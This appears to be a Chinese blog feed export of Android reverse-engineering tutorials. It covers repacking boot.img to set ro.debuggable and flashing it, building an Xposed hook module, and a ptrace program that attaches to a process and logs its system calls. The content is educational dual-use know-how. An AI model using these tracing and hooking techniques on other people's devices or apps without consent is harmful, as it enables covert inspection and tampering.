../boot.img-ramdisk.gz | cpio -i</span><br></pre></td></tr></table></figure></p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4rbe97i7j311j04jq4k.jpg" alt=""></p><h2 id="修改default-prop，打开系统调试标志"><a href="#修改default-prop，打开系统调试标志" class="headerlink" title="修改default.prop，打开系统调试标志"></a>修改default.prop，打开系统调试标志</h2><p>找到解压出来的default.prop文件，将其中的ro.debuggable=0修改为ro.debuggable=1<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo4rc3yqj8j30dp0ad3zg.jpg" alt=""></p><h2 id="ramdisk目录打包"><a href="#ramdisk目录打包" class="headerlink" title="ramdisk目录打包"></a>ramdisk目录打包</h2><p>返回ramdisk的上层目录<br><code>cd ..</code><br>输入命令：<br><code>mkbootfs ./ramdisk | gzip &gt; ramdisk.img</code><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo4re3q4kgj30zu02i0tj.jpg" alt=""></p><h2 id="打包出新的boot-img"><a href="#打包出新的boot-img" class="headerlink" title="打包出新的boot.img"></a>打包出新的boot.img</h2><p>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkbootimg --base 0x00000000 --ramdisk_offset 0x02900000 --second_offset 0x00F00000 --tags_offset 0x02700000 --cmdline &apos;console=ttyHSL0 androidboot.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1 earlyprintk&apos; --kernel boot.img-kernel --ramdisk ramdisk.img -o newboot.img</span><br></pre></td></tr></table></figure></p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4rexfgzkj312c04cmyq.jpg" alt=""></p><h2 id="将新的boot-img刷入手机"><a href="#将新的boot-img刷入手机" class="headerlink" title="将新的boot.img刷入手机"></a>将新的boot.img刷入手机</h2><p><code>adb reboot bootloader</code><br><code>fastboot oem unlock</code><br><code>fastboot flash boot newboot.img</code><br><code>fastboot reboot</code><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4s0nhq7wj30rs0h20yx.jpg" alt=""></p><h2 id="确认刷入成功-debuggable修改为1"><a href="#确认刷入成功-debuggable修改为1" class="headerlink" title="确认刷入成功,debuggable修改为1"></a>确认刷入成功,debuggable修改为1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">getprop | grep debuggable</span><br></pre></td></tr></table></figure><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4ssdw7shj30mk02mgmf.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷机 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Xposed项目搭建</title>
      <link href="/2018/02/04/hook2/"/>
      <url>/2018/02/04/hook2/</url>
      <content type="html"><![CDATA[<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo4gkfn5i3j30bv0mqmz4.jpg" alt=""></p><h2 id="新建一个lib文件夹，然后将api-82-jar复制进去"><a href="#新建一个lib文件夹，然后将api-82-jar复制进去" class="headerlink" title="新建一个lib文件夹，然后将api-82.jar复制进去"></a>新建一个lib文件夹，然后将api-82.jar复制进去</h2><p>新建一个lib文件夹，然后将api-82.jar复制进去<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">下载链接</a><br>下载如下两个文件：<a href="https://bintray.com/rovo89/de.robv.android.xposed/download_file?file_path=de%2Frobv%2Fandroid%2Fxposed%2Fapi%2F82%2Fapi-82-sources.jar" target="_blank" rel="noopener">api-82-sources.jar</a>和<a href="https://bintray.com/rovo89/de.robv.android.xposed/download_file?file_path=de%2Frobv%2Fandroid%2Fxposed%2Fapi%2F82%2Fapi-82.jar" target="_blank" rel="noopener">api-82.jar</a></p><h2 id="在app的build-gradle中将添加如下语句"><a href="#在app的build-gradle中将添加如下语句" class="headerlink" title="在app的build.gradle中将添加如下语句"></a>在app的build.gradle中将添加如下语句</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">provided <span class="title">files</span><span class="params">(<span class="string">'lib/api-82.jar'</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo4h1qcqnej30nw0gbjuc.jpg" alt=""><br>作用：将libs中的Xposed框架API引用到项目中（构建依赖）</p><h2 id="在AndroidManifest-xml将自己标识为一个Xposed模块，语句添加在如下位置"><a href="#在AndroidManifest-xml将自己标识为一个Xposed模块，语句添加在如下位置" class="headerlink" title="在AndroidManifest.xml将自己标识为一个Xposed模块，语句添加在如下位置"></a>在AndroidManifest.xml将自己标识为一个Xposed模块，语句添加在如下位置</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">    android:name=<span class="string">"xposedmodule"</span></span><br><span class="line">    android:value=<span class="string">"true"</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">    android:name=<span class="string">"xposeddescription"</span></span><br><span class="line">    android:value=<span class="string">"我是一个Xposed例程"</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">    android:name=<span class="string">"xposedminversion"</span></span><br><span class="line">    android:value=<span class="string">"30"</span> /&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fo4glg5gp9j30gu0estbb.jpg" alt=""><br>作用：</p><ul><li>xposedmodule：value为true，表示自己是一个xposed模块</li><li>xposeddescription：value中的文字就是对模块的描述，这些能够在手机上的Xposed框架中看到</li><li>xposedminversion：xposed最低版本</li></ul><h2 id="在类里编写hook代码"><a href="#在类里编写hook代码" class="headerlink" title="在类里编写hook代码"></a>在类里编写hook代码</h2><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4el2kqptj30sc0d475m.jpg" alt=""><br>这里我新建了一个HookToast类，但是你可以在MainActivity里写，只要在后面写好xposed模块的入口点就好了。<br>之前在AndroidManifest.xml中标识了我们的项目是一个Xposed模块，可是我们可能会有许多Activity，<br>它怎么才能知道模块的入口在哪呢？<br>所以，下面要告诉Xposed框架，我们的应用中，Xposed模块的入口到底在哪。<br>具体代码不给出，我只是记录一下，应该怎么编辑项目而已。</p><h2 id="标注Xposed模块入口"><a href="#标注Xposed模块入口" class="headerlink" title="标注Xposed模块入口"></a>标注Xposed模块入口</h2><p>右键点击 main ， 选择new –&gt; Folder –&gt;Assets Folder，然后确认即可。<br>在assets中new一个file，文件名为xposed_init（文件类型选text），并在其中写上入口类的完整路径（下面是我的类路径，你们填自己的，就是activity中packege后面的包名）<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4eok5zihj31g00w0q96.jpg" alt=""><br>这样，xposed框架就能够读取xposed_init中的信息来找到模块的入口。</p><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo4h18eaarj30s70ikq62.jpg" alt=""><br>请确保禁用Instant Run（File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run），否则您的类不会直接包含在APK中，导致HOOK失败。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo4h4j6ub3j30ju02waav.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xposed </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hook native层学习</title>
      <link href="/2018/02/04/hook1/"/>
      <url>/2018/02/04/hook1/</url>
      <content type="html"><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://github.com/zhengmin1989/TheSevenWeapons/tree/master/LiBieGou" target="_blank" rel="noopener">https://github.com/zhengmin1989/TheSevenWeapons/tree/master/LiBieGou</a><br><a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/ptrace.2.html</a><br>在阅读之前，最好先看一下我的另一篇文章，关于<a href="http://eternalsakura13.com/2018/02/02/hello-arm/">怎么编译ARM程序</a><br>以及关于<a href="http://eternalsakura13.com/2018/02/01/ptrace/">ptrace的基础知识</a></p><h1 id="Playing-with-Ptrace-Android"><a href="#Playing-with-Ptrace-Android" class="headerlink" title="Playing with Ptrace Android"></a>Playing with Ptrace Android</h1><h2 id="示例代码target-c"><a href="#示例代码target-c" class="headerlink" title="示例代码target.c"></a>示例代码target.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sevenWeapons</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* str = <span class="string">"Hello,LiBieGou!"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s %d\n"</span>,str,number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sevenWeapons(count);</span><br><span class="line">        count++;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hook程序hook1-c"><a href="#hook程序hook1-c" class="headerlink" title="hook程序hook1.c"></a>hook程序hook1.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getSysCallNo</span><span class="params">(<span class="keyword">int</span> pid, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> scno = <span class="number">0</span>;</span><br><span class="line">    scno = ptrace(PTRACE_PEEKTEXT, pid, (<span class="keyword">void</span> *)(regs-&gt;ARM_pc - <span class="number">4</span>), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(scno == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scno == <span class="number">0xef000000</span>) &#123;</span><br><span class="line">        scno = regs-&gt;ARM_r7;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((scno &amp; <span class="number">0x0ff00000</span>) != <span class="number">0x0f900000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        scno &amp;= <span class="number">0x000fffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> scno;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hookSysCallBefore</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sysCallNo = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);    </span><br><span class="line">    sysCallNo = getSysCallNo(pid, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Before SysCallNo = %d\n"</span>,sysCallNo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sysCallNo == __NR_write)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"__NR_write: %ld %p %ld\n"</span>,regs.ARM_r0,(<span class="keyword">void</span>*)regs.ARM_r1,regs.ARM_r2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hookSysCallAfter</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sysCallNo = <span class="number">0</span>;</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);  </span><br><span class="line">    sysCallNo = getSysCallNo(pid, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"After SysCallNo = %d\n"</span>,sysCallNo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sysCallNo == __NR_write)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"__NR_write return: %ld\n"</span>,regs.ARM_r0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;pid to be traced&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> != ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Trace process failed:%d.\n"</span>, errno);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        wait(&amp;status); <span class="comment">//wait函数会延迟父进程的执行，直到被调试的进程切换为停止状态或者终止为止.</span></span><br><span class="line">        hookSysCallBefore(pid);</span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        hookSysCallAfter(pid);</span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>PTRACE_SYSCALL<br>使被调试进程继续运行,但是在下一个系统调用的<strong>入口处或出口处</strong>停下,或者是执行完一条指令后停下.<br>例如,调试进程可以监视被调试进程系统调用入口处的参数,接着再使用SYSCALL,监视系统调用的返回值.</li></ul><p>每当目标程序调用system call前的时候，就会暂停下载。然后我们就可以读取寄存器的值来获取system call的各项信息。然后我们再一次使用ptrace(PTRACE_SYSCALL, pid, NULL, NULL)这个函数就可以让system call在调用完后再一次暂停下来，并获取system call的返回值。</p><h2 id="获取system-call编号"><a href="#获取system-call编号" class="headerlink" title="获取system call编号"></a>获取system call编号</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getSysCallNo</span><span class="params">(<span class="keyword">int</span> pid, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> scno = <span class="number">0</span>;</span><br><span class="line">    scno = ptrace(PTRACE_PEEKTEXT, pid, (<span class="keyword">void</span> *)(regs-&gt;ARM_pc - <span class="number">4</span>), <span class="literal">NULL</span>); <span class="comment">//读出指令</span></span><br><span class="line">    <span class="keyword">if</span>(scno == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scno == <span class="number">0xef000000</span>) &#123; <span class="comment">//如果指令是EABI</span></span><br><span class="line">        scno = regs-&gt;ARM_r7; <span class="comment">//直接从r7从取出调用号</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    <span class="comment">//如果指令是OABI</span></span><br><span class="line">        <span class="keyword">if</span> ((scno &amp; <span class="number">0x0ff00000</span>) != <span class="number">0x0f900000</span>) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        scno &amp;= <span class="number">0x000fffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> scno;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ARM架构上，所有的系统调用都是通过SWI来实现的。并且在ARM 架构中有两个SWI指令，分别针对EABI和OABI：<br>[EABI] 机器码：<br>1110 1111 0000 0000 – SWI 0<br>具体的调用号存放在寄存器r7中.<br>[OABI] 机器码：<br>1101 1111 vvvv vvvv – SWI immed_8<br>调用号进行转换以后得到指令中的立即数。立即数=调用号 | 0x900000<br>既然需要兼容两种方式的调用，我们在代码上就要分开处理。首先要获取SWI指令判断是EABI还是OABI，如果是EABI，可从r7中获取调用号。如果是OABI，则从SWI指令中获取立即数，反向计算出调用号。</p><p><strong>OABI和EABI的区别</strong><br>两种ABI在如下方面有区别：<br>A。调用规则（包括参数如何传递及如何获得返回值）<br>B。系统调用的数目以及应用程序应该如何去做系统调用<br>C。目标文件的二进制格式，程序库等<br>D。结构体中的填充（padding/packing）和对齐。</p><p>PTRACE_PEEKTEXT, PTRACE_PEEKDATA<br>形式：ptrace(PTRACE_PEEKTEXT, pid, addr, data)<br>         ptrace(PTRACE_PEEKDATA, pid, addr, data)<br>描述：从内存地址中读取一个字节，pid表示被跟踪的子进程，内存地址由addr给出，data为用户变量地址用于返回读到的数据。在Linux（i386）中用户代码段与用户数据段重合所以读取代码段和数据段数据处理是一样的。</p><h2 id="hook程序运行逻辑"><a href="#hook程序运行逻辑" class="headerlink" title="hook程序运行逻辑"></a>hook程序运行逻辑</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">0</span> != ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Trace process failed:%d.\n"</span>, errno);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    wait(&amp;status); <span class="comment">//wait函数会延迟父进程的执行，直到被调试的进程切换为停止状态或者终止为止.</span></span><br><span class="line">    hookSysCallBefore(pid);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    hookSysCallAfter(pid);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被调试进程：被debugger attach  ——<em>被PTRACE_SYSCALL</em>——-&gt;在syscall的入口处停止—<em>被PTRACE_SYSCALL</em>—&gt;在syscall的出口处停止</p><p>进行调试的进程：attach要调试的进程——<em>PTRACE_SYSCALL/wait</em>——–&gt;等待被调试进程停止—-&gt;读取调用入口处的参数—<em>PTRACE_SYSCALL/wait</em>—&gt;监视系统调用的返回值</p><h2 id="hook-system-call前的函数，和hook-system-call后的函数"><a href="#hook-system-call前的函数，和hook-system-call后的函数" class="headerlink" title="hook system call前的函数，和hook system call后的函数"></a>hook system call前的函数，和hook system call后的函数</h2><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo3a2257haj30gv0eb421.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hookSysCallBefore</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sysCallNo = <span class="number">0</span>;</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);    </span><br><span class="line">    sysCallNo = getSysCallNo(pid, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Before SysCallNo = %d\n"</span>,sysCallNo);</span><br><span class="line">    <span class="keyword">if</span>(sysCallNo == __NR_write)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"__NR_write: %ld %p %ld\n"</span>,regs.ARM_r0,(<span class="keyword">void</span>*)regs.ARM_r1,regs.ARM_r2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hookSysCallAfter</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sysCallNo = <span class="number">0</span>;</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);  </span><br><span class="line">    sysCallNo = getSysCallNo(pid, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"After SysCallNo = %d\n"</span>,sysCallNo);</span><br><span class="line">    <span class="keyword">if</span>(sysCallNo == __NR_write)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"__NR_write return: %ld\n"</span>,regs.ARM_r0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>PTRACE_GETREGS<br>形式：ptrace(PTRACE_GETREGS, pid, 0, data)<br>描述：读取寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有17个基本寄存器的值。</p><p>在获取了system call的number以后，我们可以进一步获取个个参数的值.比如说write这个system call。<br>在arm上，如果形参个数少于或等于4，则形参由R0,R1,R2,R3四个寄存器进行传递。<br>若形参个数大于4，大于4的部分必须通过堆栈进行传递。<br>而执行完函数后，函数的返回值会保存在R0这个寄存器里。</p><p>我们可以看到第一个SysCallNo是162，也就是sleep函数。第二个SysCallNo是4，也就是write函数，因为printf本质就是调用write这个系统调用来完成的。关于system call number对应的具体system call可以参考我在github上的reference文件夹中的systemcalllist.txt文件，里面有对应的列表。我们的hook1程序还对write的参数做了解析，比如1表示stdout，0xadf020表示字符串的地址，19代表字符串的长度。而返回值19表示write成功写入的长度，也就是字符串的长度。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>ps | grep target<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo39vwc2p1j30f8029jsb.jpg" alt=""><br>得到pid为10797<br>target<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo39xt0twkj30ck07maaa.jpg" alt=""><br>hook<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fo39xigwuuj30ei08kt9r.jpg" 